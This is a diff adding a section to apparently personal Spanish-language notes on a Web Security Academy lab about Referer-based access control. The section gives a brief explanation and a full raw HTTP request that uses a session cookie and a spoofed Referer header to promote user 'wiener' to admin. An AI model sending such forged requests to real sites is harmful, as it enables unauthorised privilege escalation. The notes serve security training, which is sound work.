@@ -358,5 +358,30 @@ action=upgrade&confirmed=true&username=wiener
 FIN
 
 
+# Referer-based access control
+
+Para este laboratorio basicamente se roba la cookie del admin y se usa 
+la header refer que seria lo diferente y se  puede upgretear el usuario wiener.
+```
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: 0a7e003b04379db7c09c842000320025.web-security-academy.net
+Cookie: session=F3tHjUA3H4BDXuQqxj3Hi0IRUc7Vsxz9
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Content-Length: 0
+Referer: https://0a7e003b04379db7c09c842000320025.web-security-academy.net/admin
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+```
 
 
